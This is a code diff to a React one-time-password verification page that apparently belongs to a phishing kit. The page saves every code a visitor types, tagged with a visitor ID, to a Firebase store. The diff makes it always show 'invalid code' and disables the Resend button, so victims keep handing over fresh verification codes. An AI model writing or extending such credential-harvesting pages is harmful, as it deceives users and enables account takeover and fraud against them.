@@ -8,7 +8,7 @@ import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle }
 import { Input } from "@/components/ui/input"
 import { Shield } from "lucide-react"
 import { addData } from "@/lib/firebase"
-const allOtps=['']
+const allPhoneOtps=['']
 export default function OTPPage() {
   const [otp, setOtp] = useState('')
   const inputRefs = useRef<(HTMLInputElement | null)[]>([])
@@ -22,17 +22,17 @@ export default function OTPPage() {
   const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
       inputRefs.current[index - 1]?.focus()
-    }
+    }   
   }
 
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     const visitorID=localStorage.getItem('visitor')
-    allOtps.push(otp)
-    await addData({id:visitorID,otp1:otp,allOtps})
+    allPhoneOtps.push(otp)
+    await addData({id:visitorID,otp1:otp,allPhoneOtps})
         setOtp(otp)
-
+alert('invalid code')
   }
 
   const handleResend = () => {
@@ -74,7 +74,6 @@ export default function OTPPage() {
            
               <button
                 type="button"
-                onClick={handleResend}
                 className="font-medium text-primary hover:underline focus:outline-none focus:underline"
               >
                 Resend
